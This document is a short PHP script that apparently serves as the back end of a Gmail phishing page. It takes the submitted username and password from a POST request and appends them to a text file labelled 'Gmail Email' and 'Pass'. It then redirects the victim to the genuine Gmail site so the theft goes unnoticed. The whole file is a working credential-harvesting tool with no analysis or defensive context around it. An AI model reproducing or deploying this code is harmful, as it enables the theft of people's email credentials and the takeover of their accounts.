<?php

file_put_contents("usernames.txt", "Gmail Email: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://mail.google.com');
exit();
?>
